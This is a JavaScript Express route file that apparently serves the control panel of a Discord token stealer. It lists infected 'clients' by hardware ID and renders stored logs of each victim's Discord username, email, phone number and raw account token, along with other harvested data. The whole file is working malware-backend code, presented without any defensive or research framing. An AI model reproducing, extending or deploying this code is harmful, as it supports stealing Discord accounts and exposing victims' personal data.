const moment = require('moment');

module.exports = (app) => {
    app.get('/clients', (req, res) => {
        res.render('clients', { app });
    });

    app.get('/clients/:hwid/discord', (req, res) => {
        const data = app.db.prepare('SELECT * FROM token_logs WHERE hwid = ? ORDER BY `id` DESC').all(req.params.hwid);

        let tableData = [];

        data.forEach((entry) => {
            const tokens = JSON.parse(entry.tokens);

            tokens.forEach((token) => {
                const parsedToken = JSON.parse(token);

                tableData.push({
                    id: entry.id,
                    date: moment(entry.date).utcOffset('-0400').format('MM-DD-YYYY HH:mm A'),
                    user: `${parsedToken.username}#${parsedToken.discriminator}`,
                    email: parsedToken.email,
                    phone: parsedToken.phone.replace(' ', '+'),
                    token: parsedToken.token,
                });
            });
        });

        res.render('clientDiscordLogs', { hwid: req.params.hwid, tableData });
    });

    app.get('/clients/:hwid/data', (req, res) => {
        const data = app.db.prepare('SELECT * FROM data_logs WHERE hwid = ? ORDER BY `id` DESC').all(req.params.hwid);

        let tableData = [];

        data.forEach((entry) => {
            tableData.push({
                id: entry.id,
                date: moment(entry.date).utcOffset('-0400').format('MM-DD-YYYY HH:mm A'),
                data: entry.data
            });
        });

        res.render('clientDataLogs', { hwid: req.params.hwid, tableData });
    });

    app.get('/clients/:hwid', (req, res) => {
        res.render('clientInfo', { hwid: req.params.hwid });
    });
};
